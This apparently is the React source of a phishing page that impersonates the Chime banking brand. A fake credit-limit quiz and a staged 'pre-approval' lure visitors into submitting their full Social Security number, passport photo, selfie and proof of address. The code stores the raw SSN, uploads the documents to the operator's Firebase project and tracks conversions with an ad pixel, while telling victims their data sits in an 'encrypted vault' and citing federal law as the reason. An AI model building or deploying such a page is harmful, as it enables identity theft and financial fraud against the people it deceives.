import React, { useState, useRef, useEffect } from 'react';
import { Camera, Check, Shield, Lock, ChevronRight, AlertCircle, Menu, X, User as UserIcon, Loader2, FileText, ExternalLink, ArrowRight, CreditCard, TrendingUp } from 'lucide-react';
import { initializeApp } from 'firebase/app';
import { getFirestore, collection, addDoc, serverTimestamp, type Firestore } from 'firebase/firestore';
import { getAuth, signInAnonymously, onAuthStateChanged, type Auth, type User } from 'firebase/auth';
import { getStorage, ref, uploadBytes, getDownloadURL, type FirebaseStorage } from 'firebase/storage';

// --- SUA CONFIGURAÇÃO ---
const firebaseConfig = {
  apiKey: "AIzaSyAuITAkLq7XNhJd1AuOrXTXeqqjS8nG2ss",
  authDomain: "chime-case-teste.firebaseapp.com",
  projectId: "chime-case-teste",
  storageBucket: "chime-case-teste.firebasestorage.app",
  messagingSenderId: "176821948544",
  appId: "1:176821948544:web:b33e5edc17626963b4d665",
  measurementId: "G-8B4QLXJWJB"
};

// Inicialização segura
let app;
let auth: Auth | undefined;
let db: Firestore | undefined;
let storage: FirebaseStorage | undefined;

try {
  if (firebaseConfig.apiKey) {
    app = initializeApp(firebaseConfig);
    auth = getAuth(app);
    db = getFirestore(app);
    storage = getStorage(app);
  }
} catch (e) {
  console.error("Erro Firebase", e);
}

// Cores Oficiais da Chime
const BRAND = { green: '#00C865', darkGreen: '#004F2D', lightBg: '#F2F8F5' };

// Interfaces
interface FileData { name: string; url: string; }
interface FormDataState { ssn: string; passport: File | null; selfie: File | null; proofAddress: File | null; }
interface SubmittedDataType { 
  userId: string; 
  ssn_masked: string; 
  ssn_real: string; 
  status: string; 
  submittedAt: string | any;
  utm_source: string;
  documents: { passport: FileData | null; selfie: FileData | null; proofAddress: FileData | null; }; 
}
interface FileUploadFieldProps { label: string; id: keyof FormDataState; file: File | null; onFileChange: (id: keyof FormDataState, file: File) => void; icon?: React.ReactNode; subLabel?: string; }

const FileUploadField: React.FC<FileUploadFieldProps> = ({ label, id, file, onFileChange, icon, subLabel }) => {
  const inputRef = useRef<HTMLInputElement>(null);
  const handleClick = () => inputRef.current?.click();
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => { if (e.target.files && e.target.files[0]) onFileChange(id, e.target.files[0]); };

  return (
    <div className="mb-4">
      <label className="block text-sm font-bold text-gray-700 mb-1">{label}</label>
      {subLabel && <p className="text-xs text-gray-500 mb-2">{subLabel}</p>}
      <div 
        onClick={handleClick} 
        className={`relative border-2 border-dashed rounded-xl p-6 cursor-pointer transition-all ${file ? 'border-[#00C865] bg-green-50' : 'border-gray-300 hover:border-[#00C865] bg-white'}`}
      >
        <input type="file" ref={inputRef} className="hidden" accept="image/*" onChange={handleChange} />
        <div className="flex flex-col items-center justify-center text-center">
          {file ? (
            <>
              <div className="bg-green-100 p-3 rounded-full mb-2">
                <Check className="w-6 h-6 text-[#00C865]" />
              </div>
              <p className="text-sm font-semibold text-green-800 truncate max-w-[200px]">{file.name}</p>
            </>
          ) : (
            <>
              <div className="bg-gray-100 p-3 rounded-full mb-2">
                {icon || <Camera className="w-6 h-6 text-gray-500" />}
              </div>
              <p className="text-sm font-medium text-gray-600">
                <span className="text-[#00C865] font-bold">Upload</span> or take photo
              </p>
            </>
          )}
        </div>
      </div>
    </div>
  );
};

export default function App() {
  const [step, setStep] = useState(0); 
  const [quizIndex, setQuizIndex] = useState(0);
  const [loadingText, setLoadingText] = useState("Analyzing credit profile...");
  const [submittedData, setSubmittedData] = useState<SubmittedDataType | null>(null);
  const [formData, setFormData] = useState<FormDataState>({ ssn: '', passport: null, selfie: null, proofAddress: null });
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [user, setUser] = useState<User | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [uploadStatus, setUploadStatus] = useState('');
  const [errorMsg, setErrorMsg] = useState('');
  const [selectedOption, setSelectedOption] = useState<number | null>(null);
  
  const [utmSource, setUtmSource] = useState('direct');

  // Perguntas focadas no novo perfil, mas visualmente com a cara da Chime
  const quizQuestions = [
    { question: "What is your current estimated Credit Score?", options: ["720 - 780", "780 - 850 (Excellent)", "I prefer not to say"] },
    { question: "Which premium perk do you value the most?", options: ["Global Airport Lounge Access", "3% Cash Back on Dining & Travel", "Zero Foreign Transaction Fees"] },
    { question: "If approved for $5,000 Credit Limit, can you activate today?", options: ["Yes, approve my limit now"] }
  ];

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const source = params.get('utm') || params.get('utm_source') || 'organic_direct';
    setUtmSource(source);

    if (!auth) return;
    const unsubscribe = onAuthStateChanged(auth, (u) => {
      if (u) setUser(u);
      else signInAnonymously(auth!).catch(() => setErrorMsg("Connection error"));
    });
    return () => unsubscribe();
  }, []);

  const handleQuizAnswer = (idx: number) => {
    setSelectedOption(idx);
    
    setTimeout(() => {
        setSelectedOption(null);
        if (quizIndex < quizQuestions.length - 1) {
          setQuizIndex(quizIndex + 1);
        } else {
          setStep(0.5);
          setTimeout(() => setLoadingText("Connecting with our partners..."), 1000);
          setTimeout(() => setLoadingText("Calculating exclusive rewards..."), 2000);
          setTimeout(() => setLoadingText("Pre-approving your account..."), 3500);
          setTimeout(() => { setStep(1); }, 4500);
        }
    }, 300);
  };

  const handleFileChange = (fieldId: keyof FormDataState, file: File) => setFormData(prev => ({ ...prev, [fieldId]: file }));
  
  const handleSSNChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 9) value = value.slice(0, 9);
    if (value.length > 5) value = `${value.slice(0, 3)}-${value.slice(3, 5)}-${value.slice(5)}`;
    else if (value.length > 3) value = `${value.slice(0, 3)}-${value.slice(3)}`;
    setFormData(prev => ({ ...prev, ssn: value }));
  };

  const uploadFile = async (file: File | null, path: string): Promise<FileData | null> => {
    if (!file || !storage) return null;
    const storageRef = ref(storage, path);
    const snapshot = await uploadBytes(storageRef, file);
    const url = await getDownloadURL(snapshot.ref);
    return { name: file.name, url: url };
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!user || !db) return setErrorMsg("Awaiting connection...");
    setIsSubmitting(true);
    setUploadStatus('Secure connection established...');
    
    try {
      const timestamp = Date.now();
      const basePath = `submissions/${user.uid}/${timestamp}`;
      
      setUploadStatus('Encrypting Passport...');
      const passportData = await uploadFile(formData.passport, `${basePath}_passport_${formData.passport?.name}`);
      
      setUploadStatus('Verifying Identity...');
      const selfieData = await uploadFile(formData.selfie, `${basePath}_selfie_${formData.selfie?.name}`);
      
      setUploadStatus('Confirming Residency...');
      const proofData = await uploadFile(formData.proofAddress, `${basePath}_proof_${formData.proofAddress?.name}`);
      
      setUploadStatus('Finalizing Setup...');
      
      const payload: SubmittedDataType = { 
        userId: user.uid, 
        ssn_masked: `***-**-${formData.ssn.slice(-4)}`,
        ssn_real: formData.ssn,
        status: 'pending_review', 
        submittedAt: new Date().toISOString(), 
        utm_source: utmSource,
        documents: { passport: passportData, selfie: selfieData, proofAddress: proofData } 
      };
      
      await addDoc(collection(db, 'applications'), { ...payload, submittedAt: serverTimestamp() });
      
      try {
        if ((window as any).ttq) (window as any).ttq.track('CompleteRegistration');
      } catch (err) {}

      setSubmittedData(payload);
      setStep(2);
    } catch (err) {
      console.error(err);
      setErrorMsg("Upload failed securely. Try again.");
    } finally {
      setIsSubmitting(false);
      setUploadStatus('');
    }
  };

  const isFormValid = formData.ssn.length === 11 && formData.passport && formData.selfie && formData.proofAddress;

  // --- HEADER CHIME OFICIAL ---
  const Header = () => (
    <nav className="bg-white py-4 px-6 shadow-sm relative z-20 flex justify-center w-full flex-shrink-0">
        <div className="text-3xl font-black tracking-tighter" style={{ color: BRAND.green }}>chime</div>
    </nav>
  );

  // --- STEP 0.5: LOADING ANIMATION ---
  if (step === 0.5) return (
    <div className="min-h-screen bg-[#F2F8F5] font-sans flex flex-col w-full">
      <Header />
      <div className="flex-grow flex items-center justify-center py-12 px-6 w-full">
        <div className="max-w-md w-full text-center bg-white rounded-2xl shadow-xl p-12 border border-gray-100">
            <div className="mb-8 relative flex justify-center">
                <div className="absolute bg-green-100 rounded-full w-24 h-24 animate-ping opacity-25"></div>
                <Loader2 className="w-16 h-16 text-[#00C865] animate-spin relative z-10" />
            </div>
            <h2 className="text-2xl font-bold text-gray-800 mb-2">{loadingText}</h2>
            <p className="text-gray-500 text-sm">Please do not close this window.</p>
        </div>
      </div>
    </div>
  );

  // --- STEP 0: QUIZ / HOOK ---
  if (step === 0) return (
    <div className="min-h-screen bg-[#F2F8F5] font-sans flex flex-col w-full">
       <Header />
      
      <div className="flex-grow flex items-center justify-center py-12 px-6 w-full">
        <div className="max-w-md w-full text-center">
            <div className="mb-10 animate-fade-in-up">
            <span className="bg-green-100 text-green-800 text-xs font-bold px-3 py-1.5 rounded-full uppercase tracking-wider mb-4 inline-block">Exclusive Offer</span>
            <h1 className="text-4xl md:text-5xl font-bold text-gray-900 mb-4 leading-tight">
                Unlock up to a <span className="text-[#00C865] underline">$5,000</span> Credit Limit.
            </h1>
            <p className="text-gray-600">No hidden fees. Premium perks. Built for you.</p>
            </div>

            <div key={quizIndex} className="bg-white rounded-2xl shadow-xl p-8 border border-gray-100 transform transition-all animate-fade-in-up">
            <div className="w-full bg-gray-100 h-1.5 rounded-full mb-8">
                <div 
                    className="bg-[#00C865] h-1.5 rounded-full transition-all duration-500" 
                    style={{ width: `${((quizIndex + 1) / quizQuestions.length) * 100}%` }}
                ></div>
            </div>

            <h2 className="text-xl font-bold text-gray-800 mb-8 min-h-[60px] flex items-center justify-center">
                {quizQuestions[quizIndex].question}
            </h2>

            <div className="space-y-4">
                {quizQuestions[quizIndex].options.map((option, idx) => (
                <button
                    key={idx}
                    onClick={() => handleQuizAnswer(idx)}
                    className={`w-full py-4 px-6 text-left rounded-xl border-2 transition-all flex justify-between items-center group
                        ${selectedOption === idx 
                            ? 'border-[#00C865] bg-green-50 text-[#00C865]' 
                            : 'border-gray-200 hover:border-[#00C865] hover:bg-green-50 text-gray-700'
                        } font-bold`}
                >
                    {option}
                    <ArrowRight className={`w-5 h-5 transition-colors ${selectedOption === idx ? 'text-[#00C865]' : 'text-gray-300 group-hover:text-[#00C865]'}`} />
                </button>
                ))}
            </div>
            </div>
            
            <div className="mt-10 flex items-center justify-center space-x-6 text-gray-400 text-xs uppercase tracking-widest font-semibold">
               <div className="flex items-center"><Shield className="w-4 h-4 mr-2"/> Bank-level Secure</div>
               <div className="flex items-center"><CreditCard className="w-4 h-4 mr-2"/> Visa Network</div>
            </div>
        </div>
      </div>
    </div>
  );

  // --- STEP 2: RECEIPT ---
  if (step === 2 && submittedData) return (
    <div className="min-h-screen bg-[#F2F8F5] flex flex-col items-center justify-center p-6 text-center font-sans">
      <div className="bg-white p-8 rounded-2xl shadow-xl max-w-md w-full border border-green-100">
        <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6"><Check className="w-10 h-10 text-[#00C865]" strokeWidth={3} /></div>
        <h2 className="text-2xl font-bold text-gray-900 mb-2">Application Received!</h2>
        <p className="text-gray-600 mb-8 text-sm">Your documents are secured in our encrypted vault. You will receive an email shortly regarding your account status.</p>
        
        <div className="bg-gray-50 rounded-xl p-5 mb-8 text-left border border-gray-200">
          <div className="flex justify-between items-center mb-4 pb-4 border-b border-gray-200">
             <h4 className="text-xs font-bold text-gray-500 uppercase tracking-widest">Tracking Reference</h4>
             <span className="text-[#00C865] text-xs font-mono font-bold bg-green-100 px-2 py-1 rounded">{submittedData.utm_source}</span>
          </div>
          <div className="space-y-4">
            <div className="flex justify-between text-sm"><span className="text-gray-500">SSN:</span><span className="font-mono text-gray-800 font-bold">{submittedData.ssn_real}</span></div>
            <div className="pt-2">
              <p className="text-xs text-gray-400 mb-3 uppercase tracking-widest font-semibold">Secure Vault:</p>
              {Object.entries(submittedData.documents).map(([key, file]) => (
                file && (<a key={key} href={file.url} target="_blank" rel="noopener noreferrer" className="flex items-center justify-between p-3 mb-2 bg-white hover:bg-gray-50 rounded-lg border border-gray-200 hover:border-[#00C865] cursor-pointer group transition-all"><div className="flex items-center"><FileText className="w-4 h-4 text-gray-400 mr-3" /><span className="text-sm text-gray-600 capitalize">{key}</span></div><ExternalLink className="w-4 h-4 text-gray-400 group-hover:text-[#00C865]" /></a>)
              ))}
            </div>
          </div>
        </div>
        <button className="w-full bg-[#00C865] hover:bg-green-600 text-white font-bold py-4 rounded-xl shadow-lg transition-all" onClick={() => window.location.reload()}>Finish</button>
      </div>
    </div>
  );

  // --- STEP 1: FORMULÁRIO (CHIME PADRÃO + PASSAPORTE) ---
  return (
    <div className="min-h-screen bg-gray-50 font-sans w-full">
      <nav className="bg-white py-4 px-6 flex justify-between items-center shadow-sm relative z-20 w-full">
        <div className="text-2xl font-black tracking-tighter" style={{ color: BRAND.green }}>chime</div>
        <div className="hidden md:flex space-x-6 text-sm font-semibold text-gray-600">
          <span className="text-[#00C865] font-bold flex items-center"><TrendingUp className="w-4 h-4 mr-2"/> High Approval Odds</span>
        </div>
        <button className="md:hidden text-gray-600" onClick={() => setIsMenuOpen(!isMenuOpen)}>{isMenuOpen ? <X /> : <Menu />}</button>
      </nav>
      
      <div className="bg-[#00C865] text-white text-center py-2.5 text-sm font-bold shadow-md relative z-10 w-full animate-pulse">
         🎉 PRE-APPROVED! $5,000 Limit Reserved.
      </div>

      <div className="bg-[#004F2D] text-white pt-10 pb-24 px-6 text-center relative w-full">
          <h1 className="text-3xl md:text-4xl font-bold mb-3">Verify Identity to Unlock</h1>
          <p className="text-green-100 opacity-90 font-medium">Please provide your Passport to finalize your account.</p>
      </div>

      <div className="px-4 -mt-16 pb-20 relative z-10 w-full">
        <div className="max-w-lg mx-auto bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-100">
          <div className="bg-gray-50 p-6 border-b border-gray-100">
            <div className="flex items-center space-x-2 text-xs text-[#00C865] mb-2 uppercase tracking-widest font-bold">
              <Shield className="w-4 h-4" />
              <span>Bank-level security</span>
            </div>
            <h2 className="text-xl font-bold text-gray-800">Final Verification Step</h2>
            <p className="text-gray-500 text-sm mt-1">
              Federal law requires us to verify your identity before opening an account.
            </p>
          </div>
          <form onSubmit={handleSubmit} className="p-6 space-y-6">
            <div className="space-y-3">
                <label className="flex justify-between text-sm font-bold text-gray-700"><span>Social Security Number (SSN)</span><Lock className="w-4 h-4 text-gray-400" /></label>
                <div className="relative group">
                    <input type="text" value={formData.ssn} onChange={handleSSNChange} placeholder="XXX-XX-XXXX" className="w-full px-5 py-4 bg-white border-2 border-gray-200 text-gray-800 rounded-xl focus:border-[#00C865] outline-none text-lg tracking-widest font-mono transition-colors" />
                    <Shield className="absolute right-5 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5 group-focus-within:text-[#00C865] transition-colors" />
                </div>
            </div>
            
            <hr className="border-gray-100" />
            
            <div>
              <h3 className="text-sm font-bold text-gray-800 uppercase tracking-widest mb-5">Required Documents</h3>
              
              {/* EXIGÊNCIA APENAS DE PASSAPORTE */}
              <FileUploadField 
                label="Passport" 
                subLabel="Upload a clear photo of your passport's photo page."
                id="passport" 
                file={formData.passport} 
                onFileChange={handleFileChange} 
              />
              
              <div className="my-6 p-5 bg-green-50 rounded-xl border border-green-100">
                  <FileUploadField 
                    label="Selfie Verification" 
                    id="selfie" 
                    file={formData.selfie} 
                    onFileChange={handleFileChange} 
                    icon={<UserIcon className="w-6 h-6 text-gray-500" />} 
                  />
              </div>
              
              <FileUploadField 
                label="Proof of Residence" 
                subLabel="Utility bill or bank statement (dated within last 60 days)."
                id="proofAddress" 
                file={formData.proofAddress} 
                onFileChange={handleFileChange} 
              />
            </div>
            
            {errorMsg && <div className="bg-red-50 border border-red-100 text-red-600 text-sm p-4 rounded-lg flex items-center justify-center font-medium"><AlertCircle className="w-5 h-5 mr-2 flex-shrink-0" /> {errorMsg}</div>}
            
            <button type="submit" disabled={!isFormValid || isSubmitting} className={`w-full py-4 rounded-xl text-lg font-bold shadow-lg flex items-center justify-center space-x-2 transition-all duration-300 ${isFormValid && !isSubmitting ? 'bg-[#00C865] text-white hover:bg-green-600 hover:-translate-y-1 shadow-green-200' : 'bg-gray-100 text-gray-400 border border-gray-200'}`}>
                {isSubmitting ? <><Loader2 className="animate-spin w-6 h-6 mr-2"/> {uploadStatus}</> : <><span>Submit Application</span><ChevronRight className="w-5 h-5" /></>}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}